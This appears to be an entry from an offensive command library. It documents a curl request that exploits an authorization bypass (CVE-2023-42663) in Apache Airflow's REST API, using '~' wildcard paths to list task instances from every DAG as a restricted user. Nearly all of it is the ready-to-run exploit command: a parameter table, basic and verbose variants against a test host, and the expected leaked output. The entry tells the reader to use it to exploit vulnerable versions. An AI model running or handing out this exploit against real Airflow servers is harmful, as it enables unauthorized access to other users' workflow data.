---
id: cmd-001
data: >-
  curl -X POST 'http://target:8080/api/v1/dags/~/dagRuns/~/taskInstances/list'
  -H 'Accept: application/json' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel
  Mac OS X 10_15_7) AppleWebKit/537.36' -H 'Content-Type: application/json' -H
  'Cookie:
  session=3d17f3fe-e02b-4f16-88f1-fd59e299ae0c.a4kyHK7of13T0NtbCVVmPgFtSDU' -d
  '{}'
tags:
  - api
  - bypass
  - airflow
type: command
output: null
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:18.278Z'
verified: false
validated: true
submitted: true
---
# airflow-api-taskinstances-bypass

## Command

```bash
curl -X POST 'http://target:8080/api/v1/dags/~/dagRuns/~/taskInstances/list' \
  -H 'Accept: application/json' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=3d17f3fe-e02b-4f16-88f1-fd59e299ae0c.a4kyHK7of13T0NtbCVVmPgFtSDU' \
  -d '{}'
```

## Description

This curl command sends a POST request to the Airflow API endpoint using wildcard paths (~) to list task instances from all DAGs, bypassing authorization checks for a restricted user. Use it to exploit CVE-2023-42663 in Airflow < 2.7.2.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `http://target:8080/api/v1/dags/~/dagRuns/~/taskInstances/list` | API endpoint with ~ wildcards for all DAGs/runs | Yes |
| `-H 'Accept: application/json'` | Requests JSON response | Yes |
| `-H 'User-Agent: ...'` | Mimics browser user agent | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON body type | Yes |
| `-H 'Cookie: session=...'` | Authenticated session cookie | Yes |
| `-d '{}'` | Empty JSON body to trigger list | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'http://testvul.com:8080/api/v1/dags/~/dagRuns/~/taskInstances/list' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Cookie: session=your_session_here' -d '{}'
```

### Advanced Usage

Add verbose output with `-v` for debugging:

```bash
curl -v -X POST 'http://testvul.com:8080/api/v1/dags/~/dagRuns/~/taskInstances/list' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Cookie: session=your_session_here' -d '{}'
```

## Expected Output

JSON object with 'task_instances' array containing details like dag_id, task_id, start_date from all DAGs, e.g., {"task_instances": [{"dag_id": "other_dag", "task_id": "task1", ...}]}.

## Related

- [[procedures/Exploit-Airflow-API-with-Wildcard-Paths]]
